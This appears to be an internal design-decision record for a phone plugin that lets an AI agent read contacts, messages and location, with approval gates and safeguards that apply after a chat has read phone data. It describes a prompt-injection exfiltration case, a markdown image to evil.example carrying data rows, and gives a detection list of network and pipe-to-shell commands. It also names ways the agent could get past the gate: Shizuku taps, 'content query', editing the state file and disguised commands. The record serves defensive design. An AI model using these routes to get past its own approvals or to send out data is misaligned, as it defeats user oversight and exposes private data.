# Phone data for the agent is read-only, off by default, and gated by the app

**Decided:** 2026-11-04, by the owner.

The agent should be able to read the phone's contacts, calendar, call log, messages, location and latest photos, but this
data is sensitive, it goes to the model provider, and messages can contain text written by strangers. The agent also runs
in Termux, where it can read the key the plugin uses and edit any plugin setting, so nothing stored or decided on that
side can protect this data.

**So:**

- **Off by default.** One master switch plus one switch per kind in Settings. Turning any of them on asks for the phone's
  biometric or screen lock every time, enforced in the app, not the page. A phone with no screen lock can't turn them on.
  Turning off is instant.
- **Read-only.** No write or send permission is declared, so no sending messages and no changing contacts or calendar.
- **The app is the gatekeeper.** The switches live in the app. A read goes through only with a one-use grant from a real
  tap on Allow in the app, or because the user put that chat in Full access in the app. Hermes saying "approved" doesn't
  count: it says so with no prompt under `/yolo` or `approvals.mode: off`, and the agent can edit that setting.
- **Every read asks**, with wording the app writes from what it will actually read, and only Allow once or Deny. The
  chat's first Allow needs the fingerprint, as in [approval-needs-fingerprint](approval-needs-fingerprint.md).
- **Full access skips the ask, by the owner's choice.** The switches, permissions, limits and locked-phone refusal still
  apply, and each read still shows in the chat. The accepted risk is that text the agent reads can steer it into reading
  more with no prompt.
- **Auto access can't read.** Hermes shows no prompt there, so the tool says to use Off or Full access.
- **Nothing from a locked phone** ([no-actions-from-locked-phone](no-actions-from-locked-phone.md)).
- **Limited and marked.** Results are capped in size and marked as untrusted data, never instructions. Location is coarse,
  with no Termux:API fallback. Photos are metadata only: no image, EXIF or GPS.
- **Never logged.** No names, numbers, message text, queries or coordinates in logs, the diagnostic log or Report a problem
  ([diagnostic-log](diagnostic-log.md), [report-a-problem](report-a-problem.md)). Results do stay in the chat history.

## The limit of this gate: Shizuku

**Decided:** 2026-11-04, by the owner: the fingerprint stays on the chat's first Allow only, not on every read.

Shizuku is required ([shizuku-is-required](shizuku-is-required.md)), and it lets the agent act as Android's shell user. So
the switches and approvals protect the `phone_data` tool, but they don't fully stop an agent that misuses Shizuku:

- `phone_app` can open Messages or Contacts and read the screen, after its own once-per-app ask.
- A shell command could tap Allow with `input tap`. It can't fake a fingerprint, but after a chat's first one, later Allows
  don't ask for it.
- A shell command might read some of this data directly with `content query`. This has not been tested.

**So:** Say this plainly in the privacy doc. Don't describe the gate as stopping everything the agent can do on the phone.

## Chats that have read phone data

**Decided:** 2026-11-04, delegated by the owner to the coordinator, as the option that keeps convenience and safety.

The problem: a hostile text message can tell the agent to write `![](https://evil.example/x.png?d=<rows>)`. After the user
allows one read, the page loads the image and the data leaves with no tap. A link or a card's `@OpenUrl` does it with one
tap, and a command such as `curl` can too.

**So, only in chats that have read phone data, for the rest of that chat, and only for actions that can send data out.** A
chat has read when a `phone_data` tool call exists in it, whatever its outcome. Every other chat behaves exactly as before.

- **The page, in every access mode including Full access.** Remote images, video and audio in the agent's text don't load:
  a placeholder shows the host name and "Tap to load", and nothing is requested before the tap. Video cards show no
  thumbnail. Links, inline-code addresses, file chips, links in an HTML preview and a card's `@OpenUrl` show the full address
  (site, address, and the query on its own) in an in-app dialog and open only on confirmation. Local files and attachments
  load as always. The state is derived from the chat's items, so it survives a reload or a resume and covers replies already
  drawn when the read happens.
- **The plugin, except in Full access.** The chat is remembered (in memory, and in a small bounded file under
  `~/.hermes/mobile/`: chat ids only, never data). Its `pre_tool_call` hook then makes Hermes ask the user before terminal
  commands that match network tools, code that talks to the network, web and browser tools, and message-sending tools. The
  ask says this chat has read phone data and shows the command; it uses a fresh rule key each time, so no answer carries over.
  Reading files and other commands run as usual. If the check can't load, those tools are blocked in that chat.

**Limits, stated plainly:**

- The list of network commands is patterns. A disguised command (built from variables, or a script file that makes the call)
  can slip through. It is a speed bump.
- In Full access and in Auto access, Hermes's gate approves without asking, so the plugin's ask never shows. Only the
  page's protection holds there.
- The agent runs in Termux and can edit the plugin's state file to make a chat look unread.
- Shizuku routes are unchanged (see above).

### Plugin side of the after-read protection

Added 2026-11-04 after an independent review of the first version. The page side above is unchanged.

**Which chat counts as read.** A chat is known by two ids: the gateway's runtime id (new after a gateway restart or a
resume) and the agent's stored id (kept by a resume, replaced by a context compression). Both are remembered, and when a
call matches one the other is added, so a restart plus resume, or a compression, keeps the chat marked. One case is not
covered: both ids changing before any tool call. The state file is locked while it is written, and holds at most 2000
chats.

**Subagents.** Hermes tells the plugin who spawned whom (`subagent_start` carries the parent's and the child's stored
ids), and runs a child in a copy of the parent's context, so it shares the runtime id. A child that reads phone data marks
its parent and grandparents; a child of a chat that has read starts marked. The link is kept in memory only, and a
subagent started outside the gateway (no runtime id, no hook) is the one gap.

**What asks in a chat that has read.** Terminal commands whose command word is a network tool (including `gh`, `host`,
`dig`, `nslookup`), `git push`, `clone`, `fetch` and `pull`, a shell fed by a pipe (`| sh`, `| busybox sh`), `bash -c`
text (read inside), decoded text run as code (`base64 -d` into a shell or interpreter, `bash -c "$(...|base64 -d)"`),
interpreter one-liners and input from a pipe, `eval`; code that uses the network; the web, browser, message, cron, image,
video, speech and `delegate_task` tools; `process_manage` `write` and `submit` (they type into a running shell);
and `memory` and `skill_manage`, whose ask says the text would carry phone data into other chats. The ask names the matched
pattern first and shows the start and the end of a long command. **What doesn't:** reading files, `grep curl`,
`git commit -m "...python..."`, `python3 -m pytest`, `cat docs/links.md` and other ordinary commands; `process_manage`
`poll`, `log`, `wait` and `kill`; `write_file` and `patch`.

**Limits.** The matcher reads command words; it does not run anything. A script file that makes the call, an alias, a
program that runs a command from inside, or an unusual construction can hide a command. `write_file` into a skill
directory can also persist text, and is not asked. In Full access and Auto access, Hermes's own gate approves without
asking, so no ask shows there (accepted). Choosing "Always" on an ask saves a random one-use key that never matches again,
because Hermes offers no way to switch that choice off; it is harmless but useless.
